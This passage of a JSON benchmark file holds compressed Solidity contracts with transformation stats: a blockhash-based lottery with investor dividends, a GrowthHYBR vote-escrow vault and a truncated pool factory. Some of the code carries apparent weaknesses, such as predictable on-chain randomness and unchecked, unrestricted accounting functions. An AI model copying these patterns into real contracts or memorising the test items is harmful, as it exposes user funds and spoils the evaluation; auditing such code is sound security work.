* 24 * 30);\nmsg.sender.transfer(maxpay);\n}\n}\nfunction investDirect() payable external {\ninvest(owner);\n}\nfunction invest(address _partner) payable public {\nrequire(investStart > 1 && block.number < investStart + (hashesSize * 5) && investBalance < investBalanceMax);\nuint investing = msg.value;\nif(investing > investBalanceMax - investBalance) {\ninvesting = investBalanceMax - investBalance;\ninvestBalance = investBalanceMax;\ninvestStart = 0;\nmsg.sender.transfer(msg.value.sub(investing));\n}\nelse{\ninvestBalance += investing;\n}\nif(_partner == address(0) || _partner == owner){\nwalletBalance += investing / 10;\nwallets[owner].balance += uint208(investing / 10);}\nelse{\nwalletBalance += (investing * 5 / 100) * 2;\nwallets[owner].balance += uint208(investing * 5 / 100);\nwallets[_partner].balance += uint208(investing * 5 / 100);}\nwallets[msg.sender].lastDividendPeriod = uint16(dividendPeriod);\nuint senderBalance = investing / 10**15;\nuint ownerBalance = investing * 16 / 10**17 ;\nuint animatorBalance = investing * 10 / 10**17 ;\nbalances[msg.sender] += senderBalance;\nbalances[owner] += ownerBalance ;\nbalances[animator] += animatorBalance ;\ntotalSupply += senderBalance + ownerBalance + animatorBalance;\nTransfer(address(0),msg.sender,senderBalance);\nTransfer(address(0),owner,ownerBalance);\nTransfer(address(0),animator,animatorBalance);\nLogInvestment(msg.sender,_partner,investing);\n}\nfunction disinvest() external {\nrequire(investStart == 0);\ncommitDividend(msg.sender);\nuint initialInvestment = balances[msg.sender] * 10**15;\nTransfer(msg.sender,address(0),balances[msg.sender]);\ndelete balances[msg.sender];\ninvestBalance -= initialInvestment;\nwallets[msg.sender].balance += uint208(initialInvestment * 9 / 10);\npayWallet();\n}\nfunction payDividends() external {\nrequire(investStart == 0);\ncommitDividend(msg.sender);\npayWallet();\n}\nfunction commitDividend(address _who) internal {\nuint last = wallets[_who].lastDividendPeriod;\nif((balances[_who]==0) || (last==0)){\nwallets[_who].lastDividendPeriod=uint16(dividendPeriod);\nreturn;\n}\nif(last==dividendPeriod) {\nreturn;\n}\nuint share = balances[_who] * 0xffffffff / totalSupply;\nuint balance = 0;\nfor(;last<dividendPeriod;last++) {\nbalance += share * dividends[last];\n}\nbalance = (balance / 0xffffffff);\nwalletBalance += balance;\nwallets[_who].balance += uint208(balance);\nwallets[_who].lastDividendPeriod = uint16(last);\nLogDividend(_who,balance,last);\n}\nfunction betPrize(Bet _player, uint24 _hash) constant private returns (uint) {\nuint24 bethash = uint24(_player.betHash);\nuint24 hit = bethash ^ _hash;\nuint24 matches =\n((hit & 0xF) == 0 ? 1 : 0 ) +\n((hit & 0xF0) == 0 ? 1 : 0 ) +\n((hit & 0xF00) == 0 ? 1 : 0 ) +\n((hit & 0xF000) == 0 ? 1 : 0 ) +\n((hit & 0xF0000) == 0 ? 1 : 0 ) +\n((hit & 0xF00000) == 0 ? 1 : 0 );\nif(matches == 6){\nreturn(uint(_player.value) * 7000000);\n}\nif(matches == 5){\nreturn(uint(_player.value) * 20000);\n}\nif(matches == 4){\nreturn(uint(_player.value) * 500);\n}\nif(matches == 3){\nreturn(uint(_player.value) * 25);\n}\nif(matches == 2){\nreturn(uint(_player.value) * 3);\n}\nreturn(0);\n}\nfunction betOf(address _who) constant external returns (uint) {\nBet memory player = bets[_who];\nif( (player.value==0) ||\n(player.blockNum<=1) ||\n(block.number<player.blockNum) ||\n(block.number>=player.blockNum + (10 * hashesSize))){\nreturn(0);\n}\nif(block.number<player.blockNum+256){\nreturn(betPrize(player,uint24(block.blockhash(player.blockNum))));\n}\nif(hashFirst>0){\nuint32 hash = getHash(player.blockNum);\nif(hash == 0x1000000) {\nreturn(uint(player.value));\n}\nelse{\nreturn(betPrize(player,uint24(hash)));\n}\n}\nreturn(0);\n}\nfunction won() public {\nBet memory player = bets[msg.sender];\nif(player.blockNum==0){\nbets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\nreturn;\n}\nif((player.value==0) || (player.blockNum==1)){\npayWallet();\nreturn;\n}\nrequire(block.number>player.blockNum);\nif(player.blockNum + (10 * hashesSize) <= block.number){\nLogLate(msg.sender,player.blockNum,block.number);\nbets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\nreturn;\n}\nuint prize = 0;\nuint32 hash = 0;\nif(block.number<player.blockNum+256){\nhash = uint24(block.blockhash(player.blockNum));\nprize = betPrize(player,uint24(hash));\n}\nelse {\nif(hashFirst>0){\nhash = getHash(player.blockNum);\nif(hash == 0x1000000) {\nprize = uint(player.value);\n}\nelse{\nprize = betPrize(player,uint24(hash));\n}\n}\nelse{\nLogLate(msg.sender,player.blockNum,block.number);\nbets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\nreturn();\n}\n}\nbets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});\nif(prize>0) {\nLogWin(msg.sender,uint(player.betHash),uint(hash),prize);\nif(prize > maxWin){\nmaxWin = prize;\nLogRecordWin(msg.sender,prize);\n}\npay(prize);\n}\nelse{\nLogLoss(msg.sender,uint(player.betHash),uint(hash));\n}\n}\nfunction () payable external {\nif(msg.value > 0){\nif(investStart>1){\ninvest(owner);\n}\nelse{\nplay();\n}\nreturn;\n}\nif(investStart == 0 && balances[msg.sender]>0){\ncommitDividend(msg.sender);}\nwon();\n}\nfunction play() payable public returns (uint) {\nreturn playSystem(uint(sha3(msg.sender,block.number)), address(0));\n}\nfunction playRandom(address _partner) payable public returns (uint) {\nreturn playSystem(uint(sha3(msg.sender,block.number)), _partner);\n}\nfunction playSystem(uint _hash, address _partner) payable public returns (uint) {\nwon();\nuint24 bethash = uint24(_hash);\nrequire(msg.value <= 1 ether && msg.value < hashBetMax);\nif(msg.value > 0){\nif(investStart==0) {\ndividends[dividendPeriod] += msg.value / 20;\n}\nif(_partner != address(0)) {\nuint fee = msg.value / 100;\nwalletBalance += fee;\nwallets[_partner].balance += uint208(fee);\n}\nif(hashNext < block.number + 3) {\nhashNext = block.number + 3;\nhashBetSum = msg.value;\n}\nelse{\nif(hashBetSum > hashBetMax) {\nhashNext++;\nhashBetSum = msg.value;\n}\nelse{\nhashBetSum += msg.value;\n}\n}\nbets[msg.sender] = Bet({value: uint192(msg.value), betHash: uint32(bethash), blockNum: uint32(hashNext)});\nLogBet(msg.sender,uint(bethash),hashNext,msg.value);\n}\nputHash();\nreturn(hashNext);\n}\nfunction addHashes(uint _sadd) public returns (uint) {\nrequire(hashFirst == 0 && _sadd > 0 && _sadd <= hashesSize);\nuint n = hashes.length;\nif(n + _sadd > hashesSize){\nhashes.length = hashesSize;\n}\nelse{\nhashes.length += _sadd;\n}\nfor(;n<hashes.length;n++){\nhashes[n] = 1;\n}\nif(hashes.length>=hashesSize) {\nhashFirst = block.number - ( block.number % 10);\nhashLast = hashFirst;\n}\nreturn(hashes.length);\n}\nfunction addHashes128() external returns (uint) {\nreturn(addHashes(128));\n}\nfunction calcHashes(uint32 _lastb, uint32 _delta) constant private returns (uint) {\nreturn( ( uint(block.blockhash(_lastb )) & 0xFFFFFF )\n| ( ( uint(block.blockhash(_lastb+1)) & 0xFFFFFF ) << 24 )\n| ( ( uint(block.blockhash(_lastb+2)) & 0xFFFFFF ) << 48 )\n| ( ( uint(block.blockhash(_lastb+3)) & 0xFFFFFF ) << 72 )\n| ( ( uint(block.blockhash(_lastb+4)) & 0xFFFFFF ) << 96 )\n| ( ( uint(block.blockhash(_lastb+5)) & 0xFFFFFF ) << 120 )\n| ( ( uint(block.blockhash(_lastb+6)) & 0xFFFFFF ) << 144 )\n| ( ( uint(block.blockhash(_lastb+7)) & 0xFFFFFF ) << 168 )\n| ( ( uint(block.blockhash(_lastb+8)) & 0xFFFFFF ) << 192 )\n| ( ( uint(block.blockhash(_lastb+9)) & 0xFFFFFF ) << 216 )\n| ( ( uint(_delta) / hashesSize) << 240));\n}\nfunction getHash(uint _block) constant private returns (uint32) {\nuint delta = (_block - hashFirst) / 10;\nuint hash = hashes[delta % hashesSize];\nif(delta / hashesSize != hash >> 240) {\nreturn(0x1000000);\n}\nuint slotp = (_block - hashFirst) % 10;\nreturn(uint32((hash >> (24 * slotp)) & 0xFFFFFF));\n}\nfunction putHash() public returns (bool) {\nuint lastb = hashLast;\nif(lastb == 0 || block.number <= lastb + 10) {\nreturn(false);\n}\nuint blockn256;\nif(block.number<256) {\nblockn256 = 0;\n}\nelse{\nblockn256 = block.number - 256;\n}\nif(lastb < blockn256) {\nuint num = blockn256;\nnum += num % 10;\nlastb = num;\n}\nuint delta = (lastb - hashFirst) / 10;\nhashes[delta % hashesSize] = calcHashes(uint32(lastb),uint32(delta));\nhashLast = lastb + 10;\nreturn(true);\n}\nfunction putHashes(uint _num) external {\nuint n=0;\nfor(;n<_num;n++){\nif(!putHash()){\nreturn;\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 63,
        "mode": "compressed",
        "original_lines": 612,
        "transformed_lines": 527,
        "original_chars": 21874,
        "transformed_chars": 15098,
        "compression_ratio": 0.69
      },
      "error": null
    },
    {
      "original_id": "sn_gs_001",
      "transformed_id": "ss_l1_compressed_sn_gs_001",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./interfaces/IVotingEscrow.sol\";\nimport \"./interfaces/IVoter.sol\";\nimport \"./interfaces/IBribe.sol\";\nimport \"./interfaces/IRewardsDistributor.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/ISwapper.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\nusing SafeERC20 for IERC20;\nuint256 public transferLockPeriod = 24 hours;\nuint256 public constant MIN_LOCK_PERIOD = 1 minutes;\nuint256 public constant MAX_LOCK_PERIOD = 240 minutes;\nuint256 public head_not_withdraw_time = 1200;\nuint256 public tail_not_withdraw_time = 300;\nuint256 public withdrawFee = 100;\nuint256 public constant MIN_WITHDRAW_FEE = 10;\nuint256 public constant MAX_WITHDRAW_FEE = 1000;\nuint256 public constant BASIS = 10000;\naddress public Team;\nuint256 public rebase;\nuint256 public penalty;\nuint256 public votingYield;\nstruct UserLock {\nuint256 amount;\nuint256 unlockTime;\n}\nmapping(address => UserLock[]) public userLocks;\nmapping(address => uint256) public lockedBalance;\naddress public immutable HYBR;\naddress public immutable votingEscrow;\naddress public voter;\naddress public rewardsDistributor;\naddress public gaugeManager;\nuint256 public veTokenId;\naddress public operator;\nuint256 public lastVoteEpoch;\nuint256 public lastRebaseTime;\nuint256 public lastCompoundTime;\nISwapper public swapper;\nerror NOT_AUTHORIZED();\nevent Deposit(address indexed user, uint256 hybrAmount, uint256 sharesReceived);\nevent Withdraw(address indexed user, uint256 shares, uint256 hybrAmount, uint256 fee);\nevent Compound(uint256 rewards, uint256 newTotalLocked);\nevent PenaltyRewardReceived(uint256 amount);\nevent TransferLockPeriodUpdated(uint256 oldPeriod, uint256 newPeriod);\nevent SwapperUpdated(address indexed oldSwapper, address indexed newSwapper);\nevent VoterSet(address voter);\nevent EmergencyUnlock(address indexed user);\nevent AutoVotingEnabled(bool enabled);\nevent OperatorUpdated(address indexed oldOperator, address indexed newOperator);\nevent DefaultVotingStrategyUpdated(address[] pools, uint256[] weights);\nevent AutoVoteExecuted(uint256 epoch, address[] pools, uint256[] weights);\nconstructor(\naddress _HYBR,\naddress _votingEscrow\n) ERC20(\"Growth HYBR\", \"gHYBR\") {\nrequire(_HYBR != address(0), \"Invalid HYBR\");\nrequire(_votingEscrow != address(0), \"Invalid VE\");\nHYBR = _HYBR;\nvotingEscrow = _votingEscrow;\nlastRebaseTime = block.timestamp;\nlastCompoundTime = block.timestamp;\noperator = msg.sender;\n}\nfunction setRewardsDistributor(address _rewardsDistributor) external onlyOwner {\nrequire(_rewardsDistributor != address(0), \"Invalid rewards distributor\");\nrewardsDistributor = _rewardsDistributor;\n}\nfunction setGaugeManager(address _gaugeManager) external onlyOwner {\nrequire(_gaugeManager != address(0), \"Invalid gauge manager\");\ngaugeManager = _gaugeManager;\n}\nmodifier onlyOperator() {\nif (msg.sender != operator) {\nrevert NOT_AUTHORIZED();\n}\n_;\n}\nfunction deposit(uint256 amount, address recipient) external nonReentrant {\nrequire(amount > 0, \"Zero amount\");\nrecipient = recipient == address(0) ? msg.sender : recipient;\nIERC20(HYBR).transferFrom(msg.sender, address(this), amount);\nif (veTokenId == 0) {\n_initializeVeNFT(amount);\n} else {\nIERC20(HYBR).approve(votingEscrow, amount);\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\n_extendLockToMax();\n}\nuint256 shares = calculateShares(amount);\n_mint(recipient, shares);\n_addTransferLock(recipient, shares);\nemit Deposit(msg.sender, amount, shares);\n}\nfunction withdraw(uint256 shares) external nonReentrant returns (uint256 userTokenId) {\nrequire(shares > 0, \"Zero shares\");\nrequire(balanceOf(msg.sender) >= shares, \"Insufficient balance\");\nrequire(veTokenId != 0, \"No veNFT initialized\");\nrequire(IVotingEscrow(votingEscrow).voted(veTokenId) == false, \"Cannot withdraw yet\");\nuint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);\nuint256 epochNext = HybraTimeLibrary.epochNext(block.timestamp);\nrequire(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, \"Cannot withdraw yet\");\nuint256 hybrAmount = calculateAssets(shares);\nrequire(hybrAmount > 0, \"No assets to withdraw\");\nuint256 feeAmount = 0;\nif (withdrawFee > 0) {\nfeeAmount = (hybrAmount * withdrawFee) / BASIS;\n}\nuint256 userAmount = hybrAmount - feeAmount;\nrequire(userAmount > 0, \"Amount too small after fee\");\nuint256 veBalance = totalAssets();\nrequire(hybrAmount <= veBalance, \"Insufficient veNFT balance\");\nuint256 remainingAmount = veBalance - userAmount - feeAmount;\nrequire(remainingAmount >= 0, \"Cannot withdraw entire veNFT\");\n_burn(msg.sender, shares);\nuint256[] memory amounts = new uint256[](3);\namounts[0] = remainingAmount;\namounts[1] = userAmount;\namounts[2] = feeAmount;\nuint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);\nveTokenId = newTokenIds[0];\nuserTokenId = newTokenIds[1];\nuint256 feeTokenId = newTokenIds[2];\nIVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);\nIVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId);\nemit Withdraw(msg.sender, shares, userAmount, feeAmount);\n}\nfunction _initializeVeNFT(uint256 initialAmount) internal {\nIERC20(HYBR).approve(votingEscrow, type(uint256).max);\nuint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;\nveTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));\n}\nfunction calculateShares(uint256 amount) public view returns (uint256) {\nuint256 _totalSupply = totalSupply();\nuint256 _totalAssets = totalAssets();\nif (_totalSupply == 0 || _totalAssets == 0) {\nreturn amount;\n}\nreturn (amount * _totalSupply) / _totalAssets;\n}\nfunction calculateAssets(uint256 shares) public view returns (uint256) {\nuint256 _totalSupply = totalSupply();\nif (_totalSupply == 0) {\nreturn shares;\n}\nreturn (shares * totalAssets()) / _totalSupply;\n}\nfunction totalAssets() public view returns (uint256) {\nif (veTokenId == 0) {\nreturn 0;\n}\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nreturn uint256(int256(locked.amount));\n}\nfunction _addTransferLock(address user, uint256 amount) internal {\nuint256 unlockTime = block.timestamp + transferLockPeriod;\nuserLocks[user].push(UserLock({\namount: amount,\nunlockTime: unlockTime\n}));\nlockedBalance[user] += amount;\n}\nfunction previewAvailable(address user) external view returns (uint256 available) {\nuint256 totalBalance = balanceOf(user);\nuint256 currentLocked = 0;\nUserLock[] storage arr = userLocks[user];\nfor (uint256 i = 0; i < arr.length; i++) {\nif (arr[i].unlockTime > block.timestamp) {\ncurrentLocked += arr[i].amount;\n}\n}\nreturn totalBalance > currentLocked ? totalBalance - currentLocked : 0;\n}\nfunction _cleanExpired(address user) internal returns (uint256 freed) {\nUserLock[] storage arr = userLocks[user];\nuint256 len = arr.length;\nif (len == 0) return 0;\nuint256 write = 0;\nunchecked {\nfor (uint256 i = 0; i < len; i++) {\nUserLock memory L = arr[i];\nif (L.unlockTime <= block.timestamp) {\nfreed += L.amount;\n} else {\nif (write != i) arr[write] = L;\nwrite++;\n}\n}\nif (freed > 0) {\nlockedBalance[user] -= freed;\n}\nwhile (arr.length > write) {\narr.pop();\n}\n}\n}\nfunction _beforeTokenTransfer(\naddress from,\naddress to,\nuint256 amount\n) internal override {\nsuper._beforeTokenTransfer(from, to, amount);\nif (from != address(0) && to != address(0)) {\nuint256 totalBalance = balanceOf(from);\nuint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\nif (currentAvailable >= amount) {\nreturn;\n}\n_cleanExpired(from);\nuint256 finalAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\nrequire(finalAvailable >= amount, \"Tokens locked\");\n}\n}\nfunction claimRewards() external onlyOperator {\nrequire(voter != address(0), \"Voter not set\");\nrequire(rewardsDistributor != address(0), \"Distributor not set\");\nuint256 rebaseAmount = IRewardsDistributor(rewardsDistributor).claim(veTokenId);\nrebase += rebaseAmount;\naddress[] memory votedPools = IVoter(voter).poolVote(veTokenId);\nfor (uint256 i = 0; i < votedPools.length; i++) {\nif (votedPools[i] != address(0)) {\naddress gauge = IGaugeManager(gaugeManager).gauges(votedPools[i]);\nif (gauge != address(0)) {\naddress[] memory bribes = new address[](1);\naddress[][] memory tokens = new address[][](1);\naddress internalBribe = IGaugeManager(gaugeManager).internal_bribes(gauge);\nif (internalBribe != address(0)) {\nuint256 tokenCount = IBribe(internalBribe).rewardsListLength();\nif (tokenCount > 0) {\naddress[] memory bribeTokens = new address[](tokenCount);\nfor (uint256 j = 0; j < tokenCount; j++) {\nbribeTokens[j] = IBribe(internalBribe).bribeTokens(j);\n}\nbribes[0] = internalBribe;\ntokens[0] = bribeTokens;\nIGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\n}\n}\naddress externalBribe = IGaugeManager(gaugeManager).external_bribes(gauge);\nif (externalBribe != address(0)) {\nuint256 tokenCount = IBribe(externalBribe).rewardsListLength();\nif (tokenCount > 0) {\naddress[] memory bribeTokens = new address[](tokenCount);\nfor (uint256 j = 0; j < tokenCount; j++) {\nbribeTokens[j] = IBribe(externalBribe).bribeTokens(j);\n}\nbribes[0] = externalBribe;\ntokens[0] = bribeTokens;\nIGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\n}\n}\n}\n}\n}\n}\nfunction executeSwap(ISwapper.SwapParams calldata _params) external nonReentrant onlyOperator {\nrequire(address(swapper) != address(0), \"Swapper not set\");\nuint256 tokenBalance = IERC20(_params.tokenIn).balanceOf(address(this));\nrequire(tokenBalance >= _params.amountIn, \"Insufficient token balance\");\nIERC20(_params.tokenIn).safeApprove(address(swapper), _params.amountIn);\nuint256 hybrReceived = swapper.swapToHYBR(_params);\nIERC20(_params.tokenIn).safeApprove(address(swapper), 0);\nvotingYield += hybrReceived;\n}\nfunction compound() external onlyOperator {\nuint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));\nif (hybrBalance > 0) {\nIERC20(HYBR).safeApprove(votingEscrow, hybrBalance);\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);\n_extendLockToMax();\nlastCompoundTime = block.timestamp;\nemit Compound(hybrBalance, totalAssets());\n}\n}\nfunction vote(address[] calldata _poolVote, uint256[] calldata _weights) external {\nrequire(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\nrequire(voter != address(0), \"Voter not set\");\nIVoter(voter).vote(veTokenId, _poolVote, _weights);\nlastVoteEpoch = HybraTimeLibrary.epochStart(block.timestamp);\n}\nfunction reset() external {\nrequire(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\nrequire(voter != address(0), \"Voter not set\");\nIVoter(voter).reset(veTokenId);\n}\nfunction receivePenaltyReward(uint256 amount) external {\nif (amount > 0) {\nIERC20(HYBR).approve(votingEscrow, amount);\nif(veTokenId == 0){\n_initializeVeNFT(amount);\n} else{\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\n_extendLockToMax();\n}\n}\npenalty += amount;\nemit PenaltyRewardReceived(amount);\n}\nfunction setVoter(address _voter) external onlyOwner {\nrequire(_voter != address(0), \"Invalid voter\");\nvoter = _voter;\nemit VoterSet(_voter);\n}\nfunction setTransferLockPeriod(uint256 _period) external onlyOwner {\nrequire(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, \"Invalid period\");\nuint256 oldPeriod = transferLockPeriod;\ntransferLockPeriod = _period;\nemit TransferLockPeriodUpdated(oldPeriod, _period);\n}\nfunction setWithdrawFee(uint256 _fee) external onlyOwner {\nrequire(_fee >= MIN_WITHDRAW_FEE && _fee <= MAX_WITHDRAW_FEE, \"Invalid fee\");\nwithdrawFee = _fee;\n}\nfunction setHeadNotWithdrawTime(uint256 _time) external onlyOwner {\nhead_not_withdraw_time = _time;\n}\nfunction setTailNotWithdrawTime(uint256 _time) external onlyOwner {\ntail_not_withdraw_time = _time;\n}\nfunction setSwapper(address _swapper) external onlyOwner {\nrequire(_swapper != address(0), \"Invalid swapper\");\naddress oldSwapper = address(swapper);\nswapper = ISwapper(_swapper);\nemit SwapperUpdated(oldSwapper, _swapper);\n}\nfunction setTeam(address _team) external onlyOwner {\nrequire(_team != address(0), \"Invalid team\");\nTeam = _team;\n}\nfunction emergencyUnlock(address user) external onlyOperator {\ndelete userLocks[user];\nlockedBalance[user] = 0;\nemit EmergencyUnlock(user);\n}\nfunction getUserLocks(address user) external view returns (UserLock[] memory) {\nreturn userLocks[user];\n}\nfunction setOperator(address _operator) external onlyOwner {\nrequire(_operator != address(0), \"Invalid operator\");\naddress oldOperator = operator;\noperator = _operator;\nemit OperatorUpdated(oldOperator, _operator);\n}\nfunction getLockEndTime() external view returns (uint256) {\nif (veTokenId == 0) {\nreturn 0;\n}\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nreturn uint256(locked.end);\n}\nfunction _extendLockToMax() internal {\nif (veTokenId == 0) return;\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nif (locked.isPermanent || locked.end <= block.timestamp) return;\nuint256 maxUnlockTime = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\nif (maxUnlockTime > locked.end + 2 hours) {\ntry IVotingEscrow(votingEscrow).increase_unlock_time(veTokenId, HybraTimeLibrary.MAX_LOCK_DURATION) {\n} catch {\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 110,
        "mode": "compressed",
        "original_lines": 616,
        "transformed_lines": 367,
        "original_chars": 23018,
        "transformed_chars": 13618,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_gs_002",
      "transformed_id": "ss_l1_compressed_sn_gs_002",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity =0.7.6;\nimport \"./interfaces/ICLFactory.sol\";\nimport \"./interfaces/fees/IFeeModule.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/IFactoryRegistry.sol\";\nimport \"@openzeppelin/contracts/proxy/Clones.sol\";\nimport \"@nomad-xyz/src/ExcessivelySafeCall.sol\";\nimport \"./CLPool.sol\";\ncontract CLFactory is ICLFactory {\nusing ExcessivelySafeCall for address;\nIGaugeManager public override gaugeManager;\naddress public immutable override poolImplementation;\naddress public override owner;\naddress public override swapFeeManager;\naddress public override swapFeeModule;\naddress public override unstakedFeeManager;\naddress public override unstakedFeeModule;\nuint24 public override defaultUnstakedFee;\naddress public override protocolFeeManager;\naddress public override protocolFeeModule;\nuint24 public override defaultProtocolFee;\nmapping(int24 => uint24) public override tickSpacingToFee;\nmapping(address => mapping(address => mapping(int24 => address))) public override getPool;\nmapping(address => bool) private _isPool;\naddress[] public override allPools;\nint24[] private _tickSpacings;\nconstructor(address _poolImplementation) {\nowner = msg.sender;\nswapFeeManager = msg.sender;\nunstakedFeeManager = msg.sender;\nprotocolFeeManager = msg.sender;\npoolImplementation = _poolImplementation;\ndefaultUnstakedFee = 100_000;\ndefaultProtocolFee = 250_000;\nemit OwnerChanged(address(0), msg.sender);\nemit SwapFeeManagerChanged(address(0), msg.sender);\nemit UnstakedFeeManagerChanged(address(0), msg.sender);\nemit DefaultUnstakedFeeChanged(0, 100_000);\nenableTickSpacing(1, 100);\nenableTickSpacing(50, 500);\nenableTickSpacing(100, 500);\nenableTickSpacing(200, 3_000);\nenableTickSpacing(2_000, 10_000);\n}\nfunction setGaugeManager(address _gaugeManager) external {\nrequire(msg.sender == owner);\ngaugeManager = IGaugeManager(_gaugeManager);\n}\nfunction createPool(address tokenA, address tokenB, int24 tickSpacing, uint160 sqrtPriceX96)\nexternal\noverride\nreturns (address pool) {\nrequire(tokenA != tokenB);\n(address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\nrequire(token0 != address(0));\nrequire(tickSpacingToFee[tickSpacing] != 0);\nrequire(getPool[token0][token1][tickSpacing] == address(0));\npool = Clones.cloneDeterministic({\nmaster: poolImplementation,\nsalt: keccak256(abi.encode(token0, token1, tickSpacing))\n});\nCLPool(pool).initialize({\n_factory: address(this),\n_token0: token0,\n_token1: token1,\n_tickSpacing: tickSpacing,\n_gaugeManager: address(gaugeManager),\n_sqrtPriceX96: sqrtPriceX96\n});\nallPools.push(pool);\n_isPool[pool] = true;\ngetPool[token0][token1][tickSpacing] = pool;\ngetPool[token1][token0][tickSpacing] = pool;\nemit PoolCreated(token0, token1, tickSpacing, pool);\n}\nfunction setOwner(address _owner) external override {\naddress cachedOwner = owner;\nrequire(msg.sender == cachedOwner);\nrequire(_owner != address(0));\nemit OwnerChanged(cachedOwner, _owner);\nowner = _owner;\n}\nfunction setSwapFeeManager(address _swapFeeManager) external override {\naddress cachedSwapFeeManager = swapFeeManager;\nrequire(msg.sender == cachedSwapFeeManager);\nrequire(_swapFeeManager != address(0));\nswapFeeManager = _swapFeeManager;\nemit SwapFeeManagerChanged(cachedSwapFeeManager, _swapFeeManager);\n}\nfunction setUnstakedFeeManager(address _unstakedFeeManager) external override {\naddress cachedUnstakedFeeManager = unstakedFeeManager;\nrequire(msg.sender == cachedUnstakedFeeManager);\nrequire(_unstakedFeeManager != address(0));\nunstakedFeeManager = _unstakedFeeManager;\nemit UnstakedFeeManagerChanged(cachedUnstakedFeeManager, _unstakedFeeManager);\n}\nfunction setSwapFeeModule(address _swapFeeModule) external override {\nrequire(msg.sender == swapFeeManager);\nrequire(_swapFeeModule != address(0));\naddress oldFeeModule = swapFeeModule;\nswapFeeModule = _swapFeeModule;\nemit SwapFeeModuleChanged(oldFeeModule, _swapFeeModule);\n}\nfunction setUnstakedFeeModule(address _unstakedFeeModule) external override {\nrequire(msg.sender == unstakedFeeManager);\nrequire(_unstakedFeeModule != address(0));\naddress oldFeeModule = unstakedFeeModule;\nunstakedFeeModule = _unstakedFeeModule;\nemit UnstakedFeeModuleChanged(oldFeeModule, _unstakedFeeModule);\n}\nfunction setDefaultUnstakedFee(uint24 _defaultUnstakedFee) external override {\nrequire(msg.sender == unstakedFeeManager);\nrequire(_defaultUnstakedFee <= 500_000);\nuint24 oldUnstakedFee = defaultUnstakedFee;\ndefaultUnstakedFee = _defaultUnstakedFee;\nemit DefaultUnstakedFeeChanged(oldUnstakedFee, _defaultUnstakedFee);\n}\nfunction setProtocolFeeModule(address _protocolFeeModule) external override {\nrequire(msg.sender == protocolFeeManager);\nrequire(_protocolFeeModule != address(0));\nprotocolFeeModule = _protocolFeeModule;\n}\nfunction setProtocolFeeManager(address _protocolFeeManager) external override {\nrequire(msg.sender == protocolFeeManager);\nrequire(_protocolFeeManager != address(0));\nprotocolFeeManager = _protocolFeeManager;\n}\nfunction getSwapFee(address pool) external view override returns (uint24) {\nif (swapFeeModule != address(0)) {\n(bool success, bytes memory data) = swapFeeModule.excessivelySafeStaticCall(\n200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)\n);\nif (success) {\nuint24 fee = abi.decode(data, (uint24));\nif (fee <= 100_000) {\nreturn fee;\n}\n}\n}\nreturn tickSpacingToFee[CLPool(pool).tickSpacing()];\n}\nfunction getUnstakedFee(address pool) external view override returns (uint24) {\nif (!gaugeManager.isGaugeAliveForPool(pool)) {\nreturn 0;\n}\nif (unstakedFeeModule != address(0)) {\n(bool success, bytes memory data) = unstakedFeeModule.excessivelySafeStaticCall(\n200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)\n);\nif (success) {\nuint24 fee = abi.decode(data, (uint24));\nif (fee <= 1_000_000) {\nreturn fee;\n}\n}\n}\nreturn defaultUnstakedFee;\n}\nfunction getProtocolFee(address pool) external view override returns (uint24) {\nif (gaugeManager.isGaugeAliveForPool(pool)) {\nreturn 0;\n}\nif (protocolFeeModule != address(0)) {\n(bool success, bytes memory data) = 